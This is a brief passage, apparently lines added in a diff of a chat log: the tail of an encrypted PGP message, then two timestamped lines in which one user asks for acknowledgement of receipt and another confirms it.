+ZhM8WZ4JEdDjpJOG
+=5z9U
+-----END PGP MESSAGE-----
+[21.02.22 15:26:07] collin: acknowledge receipt
+[21.02.22 15:29:57] geraldo: Received!
